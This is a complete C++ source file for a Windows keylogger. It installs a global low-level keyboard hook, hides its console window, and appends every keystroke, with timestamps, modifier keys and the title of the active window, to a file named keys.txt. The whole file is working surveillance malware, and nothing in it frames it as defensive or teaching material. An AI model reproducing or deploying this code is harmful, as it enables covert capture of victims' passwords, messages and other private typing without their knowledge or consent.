#include <windows.h>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <map>
#include <vector>
#include <cctype>

HHOOK hKeyHook;
HWND lastWindow = NULL;

std::string getCurrentTime() {
    auto now = std::chrono::system_clock::now();
    auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count() % 1000;
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    auto local_tm = *std::localtime(&time_t_now);
    std::ostringstream oss;
    oss << std::put_time(&local_tm, "%H:%M:%S:")
        << std::setfill('0') << std::setw(3) << millis;
    return oss.str();
}

std::map<DWORD, std::string> keyMap = {
    {VK_RETURN, "ENTER"}, {VK_BACK, "BACKSPACE"}, {VK_TAB, "TAB"},
    {VK_LSHIFT, "L_SHIFT"}, {VK_RSHIFT, "R_SHIFT"}, {VK_LCONTROL, "L_CTRL"}, {VK_RCONTROL, "R_CTRL"},
    {VK_ESCAPE, "ESC"}, {VK_LEFT, "LEFT"}, {VK_RIGHT, "RIGHT"},
    {VK_UP, "UP"}, {VK_DOWN, "DOWN"}, {VK_CAPITAL, "CAPSLOCK"},
    {VK_DELETE, "DELETE"}, {VK_HOME, "HOME"}, {VK_END, "END"},
    {VK_PRIOR, "PGUP"}, {VK_NEXT, "PGDN"}, {VK_INSERT, "INSERT"},
    {VK_LMENU, "L_ALT"}, {VK_RMENU, "R_ALT"}, {VK_SPACE, "SPACE"}
};

//require for propper logging, manually lowecasing (L_SHIFT + t in log, not L_SHIFT + T) 
bool isShiftPressed() {
    return (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
}

//puts to file "key names" not vkCodes 
std::string vkToString(DWORD vkCode, KBDLLHOOKSTRUCT* p) {
    if (keyMap.find(vkCode) != keyMap.end())
        return keyMap[vkCode];


    if (vkCode >= 'A' && vkCode <= 'Z') {
        return std::string(1, std::tolower(static_cast<char>(vkCode)));
    }


    if (vkCode >= '0' && vkCode <= '9') {
        return std::string(1, static_cast<char>(vkCode));
    }

//for propper parsing symbols
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState))
        return "VK_" + std::to_string(vkCode);

//reseting Shift key state 
    keyboardState[VK_SHIFT] = 0;
    keyboardState[VK_LSHIFT] = 0;
    keyboardState[VK_RSHIFT] = 0;
    keyboardState[VK_CAPITAL] = 0;

//getting keyboard layout  
    HKL layout = GetKeyboardLayout(0);

    WCHAR buffer[5];
    int result = ToUnicodeEx(vkCode, p->scanCode, keyboardState, buffer, 4, 0, layout);
    if (result > 0)
        return std::string(buffer, buffer + result);

    return "VK_" + std::to_string(vkCode);
}
//checking whether modifier keys are pressed(0x8000) or toggled(0x0001)
std::string getModifierState() {
    std::vector<std::string> mods;
    if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) mods.push_back("L_SHIFT");
    if (GetAsyncKeyState(VK_RSHIFT) & 0x8000) mods.push_back("R_SHIFT");
    if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) mods.push_back("L_CTRL");
    if (GetAsyncKeyState(VK_RCONTROL) & 0x8000) mods.push_back("R_CTRL");
    if (GetAsyncKeyState(VK_LMENU) & 0x8000) mods.push_back("L_ALT");
    if (GetAsyncKeyState(VK_RMENU) & 0x8000) mods.push_back("R_ALT");
    if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) mods.push_back("CAPSLOCK");

    std::ostringstream oss;
    for (size_t i = 0; i < mods.size(); ++i) {
        oss << mods[i];
        if (i < mods.size() - 1) oss << " + ";
    }
    return oss.str();
}

//gets name of active window 
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "";

    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam; 
        DWORD vkCode = p->vkCode; //gives the virtual key code

        std::ofstream log("keys.txt", std::ios_base::app);// create file in cwd of this script

        HWND currentWindow = GetForegroundWindow();
        if (currentWindow != lastWindow) {
            lastWindow = currentWindow;
            std::string windowTitle = getActiveWindowTitle();
            log << "\n[" << getCurrentTime() << "] Active window: " << windowTitle << "\n";
        }

        std::string modifiers = getModifierState(); //currently pressed modifiers
        std::string key = vkToString(vkCode, p); //key as string
//write timestamp
        log << getCurrentTime() << ": ";
        if (!modifiers.empty())
            log << modifiers << " + ";
        log << key << "\n";
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
    FreeConsole();//hide console
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hKeyHook) return -1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}
